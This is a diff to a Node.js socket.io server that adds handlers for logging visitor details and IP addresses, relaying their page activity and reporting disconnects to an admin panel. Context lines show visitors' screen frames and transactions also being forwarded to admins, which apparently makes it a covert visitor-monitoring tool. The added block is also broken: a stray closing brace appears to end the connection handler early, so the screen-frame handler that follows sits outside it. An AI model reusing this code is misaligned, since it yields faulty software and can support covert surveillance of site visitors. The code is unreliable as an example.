@@ -973,6 +973,45 @@ io.on('connection', (socket) => {
     socket.emit('existing_transactions', Array.from(transactions.values()));
   }
 
+      socket.on('visitor_connected', (visitorInfo) => {
+        console.log('Visitor connected:', visitorInfo);
+        
+        // Store visitor information
+        const visitor = {
+            ...visitorInfo,
+            socketId: socket.id,
+            ip: socket.handshake.headers['x-forwarded-for'] || socket.handshake.address
+        };
+
+           // Broadcast to admin panel
+        io.to('admin_panel').emit('visitor_update', visitor);
+    });
+    
+    socket.on('ping_visitor', (data) => {
+        // Update last activity time for this visitor
+        console.log('Visitor ping:', socket.id, data);
+        
+        // Broadcast updated activity to admin panel
+        io.to('admin_panel').emit('visitor_activity', {
+            socketId: socket.id,
+            timestamp: data.timestamp,
+            action: 'ping',
+            url: data.url,
+            pid: data.pid
+        });
+    });
+
+   socket.on('disconnect', () => {
+        console.log('Client disconnected:', socket.id);
+        
+        // Notify admin panel about disconnection
+        io.to('admin_panel').emit('visitor_disconnected', {
+            socketId: socket.id,
+            timestamp: new Date().toISOString()
+        });
+    });
+});
+
   // Handle screen frame data
 socket.on('screen_frame', (data) => {
   // Forward frame data to admins
